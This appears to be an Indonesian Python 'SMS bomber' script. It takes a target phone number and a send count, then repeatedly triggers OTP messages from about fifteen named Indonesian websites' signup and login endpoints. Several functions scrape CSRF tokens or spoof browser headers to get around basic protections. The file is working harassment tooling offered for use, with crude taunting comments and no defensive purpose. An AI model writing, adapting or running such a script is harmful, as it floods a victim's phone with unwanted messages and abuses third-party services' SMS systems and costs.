# Hayooo mau recode kan lu ?
# Tinggal pake aja anjing

from bs4 import BeautifulSoup as bs
import requests as req
import json, os, string, random, base64

load = []
grey = '\033[1;90m'
red = '\033[91m'
green = '\033[92m'
yellow = '\033[93m'
blue = '\033[94m'
purple = '\033[95m'
cyan = '\033[96m'
white = '\033[0;37m'
off = '\033[m'

def main():
	os.system('clear')
	print(f'{cyan}  ___ ___  _____\n',
	f'{cyan}|   Y   ||     | {white}https{yellow}:{white}//yvtix{yellow}.{white}xyz\n',
	f'{cyan}|   1   ||  {white}°{cyan}  | {white}author{yellow}: {off}YutixCode\n',
	f'{cyan} \_   _/{red}.{white}^-----^{red}---.---.-.--------.\n',
	f'{cyan}  |{white}:  {cyan}|{red}|   __|  _  |  _  |        |\n',
	f'{cyan}  |{white}::.{cyan}|{red}|--   |   __|___._|__|__|__|\n',
	f'{cyan}  `---´{red}`-----|__| {white}v1, perfect spam\n\n',
	f'{purple}-> {white}Example{yellow}:{white} 082321404666',)
	x = input(f'{purple} ->{white} Input number{yellow}:{white} ')
	z = input(f'{purple} ->{white} Max send{yellow}:{white} ')
	print()
	for i in range(int(z)):
		mi(x,z)
		adsmedia(x,z)
		nxsms(x,z)
		foa(x,z)
		ilc(x,z)
		lopas(x,z)
		trimegah(x,z)
		#indihome(x,z)
		knc(x,z)
		urunmodal(x,z)
		dku(x,z)
		matchwatch(x,z)
		greetday(x,z)
		tokomana(x,z)
		harnic(x,z)
		knc2(x,z)

def mi(num,max):
	starting(max)
	load.append(num)
	url = 'http://access.metroindonesia.com/Member/sendpin'
	respon = req.post(url,data={'phoneno':num}).text
	status = json.loads(respon)['status']
	if status == 'SUCCESS':
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Metroindonesia {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Metroindonesia {white}> {red}Failed!")

def adsmedia(nom,max):
	_ = f'62{nom[1:]}'
	__ = _.encode("ascii")
	___ = base64.b64encode(__)
	starting(max)
	load.append(nom)
	num = ___.decode("ascii") 
	url = 'https://thaibah.com/home/resendOtp'
	dat = { 'data1':num,'data2':'MTI4NDg5MDcxNw==','data3':'cmVnaXN0ZXI=','data4':'c21z' }
	respon = req.post(url,data=dat).text
	status = json.loads(respon)['status']
	if status == 'success':
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}ADSmedia {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}ADSmedia {white}> {red}Failed!")

def nxsms(num,max):
	starting(max)
	load.append(num)
	url = 'https://app.supremacy.co/signup_otp?country_id=78&phone_number='
	respon = req.get(f'{url}{num[1:]}').text
	status = json.loads(respon)['info']['successCount']
	if status == 1:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}NXSMS {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}NXSMS {white}> {red}Failed!")

def foa(num,max):
	starting(max)
	load.append(num)
	url = 'https://foreignadmits.com/api/register-otp-generate-student'
	data = { 'mobile':f'62{num[1:]}','countryCode':'+62'}
	respon = req.post(url,data=data).text
	status = json.loads(respon)['status']
	if status == 'success':
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Foreign Admits {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Foreign Admits {white}> {red}Failed!")

def lopas(num,max):
	starting(max)
	load.append(num)
	url = 'https://www.lopas.co.id/api/send-otp'
	data = { 'nomor_telepon':num }
	respon = req.post(url,data=data).text
	status = json.loads(respon)['sukses']
	if status == True:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Lopas APP {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Lopas APP {white}> {red}Failed!")

def ilc(num,max):
	starting(max)
	load.append(num)
	ses = req.Session()
	url = 'https://ilc.id/website/register'
	raw = ses.get(url).text
	token = bs(raw,'html.parser').findAll('input')[0]['value']
	data = {'_token':token,'phone':num,'type':'customer'}
	respon = ses.post('https://ilc.id/smsverification/send',data=data).text
	status = json.loads(respon)['error']
	if status == 0:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}ILC OTP {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}ILC OTP {white}> {red}Failed!")

def trimegah(num,max):
	starting(max)
	load.append(num)
	url = 'https://sbn.trimegah.id/agent/register/sendOtp'
	data = { 'noHp':num,'email':'yvtix@zx.id' }
	respon = req.post(url,data=data).text
	status = json.loads(respon)['status']
	if status == 'success':
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Trimegah {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Trimegah {white}> {red}Failed!")

def indihome(num,max):
	starting(max)
	load.append(num)
	url = 'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp'
	data = { 'type':'hp','msisdn':num }
	respon = req.post(url,data=data).text
	status = json.loads(respon)['code']
	if status == '0':
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Indihome {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Indihome {white}> {red}Failed!")

def knc(num,max):
	starting(max)
	load.append(num)
	ses = req.Session()
	url = 'https://v2.kliknclean.com/customer/phone-sendotp'
	meta = ses.get('https://v2.kliknclean.com/customer/phone-login').text
	csrf = bs(meta,'html.parser').findAll('meta')[4]['content']
	data = { 'phone': num }
	head = { 'X-CSRF-TOKEN': csrf }
	ses.post(url,data=data,headers=head)
	print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Kliknclean {white}> {green}Sent!")

def knc2(num,max):
	starting(max)
	load.append(num)
	ses = req.Session()
	url = 'https://v2.kliknclean.com/customer/phone-sendotp-bywhatsapp'
	meta = ses.get('https://v2.kliknclean.com/customer/phone-login').text
	csrf = bs(meta,'html.parser').findAll('meta')[4]['content']
	data = { 'phone': num }
	head = { 'X-CSRF-TOKEN': csrf }
	ses.post(url,data=data,headers=head)
	print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Kliknclean {white}> {green}Sent!")

def urunmodal(num,max):
	starting(max)
	load.append(num)
	_ = random.choice(string.ascii_letters)
	__ = random.choice(string.ascii_letters)
	___ = random.choice(string.ascii_letters)
	byte = _+__+___
	host = 'https://api-21-um.urunmodal.id/sendnumber'
	data = { 'phone_no': f'{num}%{byte}' }
	respon = req.post(host, data=data).text
	status = json.loads(respon)['message']
	if status == 'berhasil':
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Urunmodal {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Urunmodal {white}> {red}Failed!")

def dku(num,max):
	starting(max)
	load.append(num)
	url = 'https://ujian.jabarmu.id/function/function_dompet.php'
	dat = {'function':'kirim_otp','f_telepon':num}
	res = req.post(url, data=dat).text
	sta = json.loads(res)['status']
	if sta == True:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}DKU OTP {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}DKU OTP {white}> {red}Failed!")

def matchwatch(num,max):
	starting(max)
	load.append(num)
	url = 'https://apiv2.jamtangan.com/validateuniqueid'
	dat = {
		'params':(None, num),
		'step':(None, '2'),
		'type':(None, 'sms')
	}
	res = req.post(url, files=dat).text
	sta = json.loads(res)['rd']
	if sta == 'success':
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Matchwatch {white}> {green}Sent!")
	else:
		print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Matchwatch {white}> {red}Failed!")

def greetday(num,max):
	starting(max)
	load.append(num)
	head = 'https://seekmi.com/register'
	haed = 'https://seekmi.com/ajax/send-otp'
	sess = req.Session()
	xraw = sess.get(head).text
	tete = bs(xraw,'html.parser').findAll('meta')[27]['content']
	data = { 'phone': num,
			 'name': 'YutixCode' }
	hulu = { 'X-CSRF-TOKEN': tete }
	sess.post(haed, data=data, headers=hulu)
	print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Seekmi {white}> {green}Sent!")

def tokomana(num,max):
	starting(max)
	load.append(num)
	dat = {'phone':num}
	req.post('https://tokomanamana.com/ma/auth/request_token_merchant/',data=dat,headers={'Host': 'tokomanamana.com',
	'Connection': 'keep-alive',
	'Content-Length': '18',
	'Accept': '*/*',
	'Origin': 'https://tokomanamana.com',
	'X-Requested-With': 'XMLHttpRequest',
	'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'Referer': 'https://tokomanamana.com/ma/register',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'id-ID,en-US;q=0.8'})
	print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Tokomana {white}> {green}Sent!")

def harnic(num,max):
	starting(max)
	load.append(num)
	postdata = { 'phone':num }
	req.post('https://harnic.id:443/login/phone_auth_OTP', data=postdata)
	print(f"{white} --{purple} [{white}{len(load)}{purple}] {white}from {cyan}Harnic {white}> {green}Sent!")

def starting(shipping):
	if len(load) == int(shipping):
		exit(f'{white} --{purple} <{white} Progress done {purple}> ')
	else:
		pass

if __name__=='__main__':
	main()